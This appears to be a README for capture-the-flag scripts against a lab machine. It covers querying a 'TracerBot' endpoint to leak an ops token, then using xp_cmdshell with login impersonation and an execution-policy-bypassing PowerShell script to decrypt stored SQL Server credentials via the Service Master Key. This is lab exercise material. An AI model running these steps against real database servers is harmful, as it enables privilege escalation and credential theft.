# Unclaimed scripts

Fill `../secrets.example.env` → `../secrets.env` locally. `unclaimed.htb` in `/etc/hosts`.

```bash
export TARGET=<ip>
chmod +x *.sh *.py
./replay.sh hosts
./replay.sh leak
# put OPS_TOKEN into secrets.env
./replay.sh whoami
```

| File | Where | What |
|------|-------|------|
| `01-ask.py` | Kali | TracerBot `POST /ask` |
| `02-decrypt-sqlcred.ps1` | **target** (SQL service) | DAC + SMK, `FlushFinalBlock` |
| `replay.sh` | Kali | wrapper |

`02-decrypt-sqlcred.ps1` must run as an account that can open DAC and DPAPI-unprotect the Service Master Key. After user (`xp_cmdshell` as `svc_sql`) is enough. Copy it on-box, then:

```sql
-- via ./replay.sh sql '...'
EXECUTE AS LOGIN = 'svc_reports';
EXEC xp_cmdshell 'powershell -ep bypass -f C:\Windows\Temp\02-decrypt-sqlcred.ps1';
```
